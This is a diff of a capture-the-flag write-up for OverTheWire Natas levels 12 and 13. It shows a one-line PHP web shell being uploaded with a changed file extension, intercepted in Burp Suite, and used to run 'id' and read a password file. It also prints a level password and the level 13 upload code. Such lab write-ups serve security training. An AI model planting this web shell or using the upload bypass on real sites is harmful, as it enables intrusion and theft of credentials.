@@ -720,7 +720,7 @@ I think we got ourselves here a file upload vulnerability
 
 We'll try uploading a ```.php``` file, since they aren't always up to ```1kb```.
 
-Save this payload ```<?php system($_GET[‘lol’]); ?>``` in a php file
+Save this payload ```<?php system($_GET['cmd']); ?>``` in a php file
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
@@ -728,11 +728,117 @@ Save this payload ```<?php system($_GET[‘lol’]); ?>``` in a php file
                                                                                                                                                                                                                                 
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
 └─$ cat abeg.php 
-<?php system($_GET[‘lol’]); ?>
+<?php system($_GET['cmd']); ?>
 ```
-Lets try to upload this and intercept using burpsuite
+Lets try to upload this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e136f209-b15f-4a49-a656-9e40bde10ba6)
+
+As you can see from the above screenshot, we uploaded a file named ```abeg.php```, it got renamed and also got the extension changed to a ```.jpg``` extension.
+
+Lets try to upload the same file again, but this time, we'll intercept using burpsuite
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35408984-bdcd-491e-9ece-705399f1b335)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07702db3-5f55-4fc8-b069-257427bfe802)
+
+Lets modify this request by changing the ```.jpg``` extension to ```.php```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed4e8f47-0209-4225-a30b-f1469261f08a)
+
+Now, forward the request
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d64a1371-de16-4a0a-a6ef-d449c4ac395b)
+
+Cool, now lets view our payload
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b8162cfc-6180-4782-9f65-88fd2d171467)
+
+Nice, we can get command injection through this by adding ```?cmd=id``` to the back of the url
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bfe81896-f2d4-459f-a6ac-cc68e8e00662)
+
+Now, lets get the password to the next level, this can be found at ```/etc/natas_webpass/natas13```. To read the password add ```?cmd=cat /etc/natas_webpass/natas13``` at the back of the url
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e517f641-09f9-45a9-b883-0eef32f0a2d7)
+
+Cool. we got the password to the next level😎
+
+
+
+# Level 13
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2917b03e-85cb-4f3f-aad6-f1dafa875268)
+
+Navigating to the webpage and using the password we found from the previous level
+
+username:```natas13```         password:```lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/badd1d2b-25ff-4f7c-9f4d-a06f6d0a80a0)
+
+Viewing the source code we get this php script
+
+```php
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+This code is similar to that of previous level, the difference is that only image files are accepted in this level. This means it won't accept a ```.php``` extension file as it did in the previous level.
+
+We can still find our way around it, right?? That's why we are h4x0rs hehe😎
+
+
+
+
+
+
+
+
 
 
 
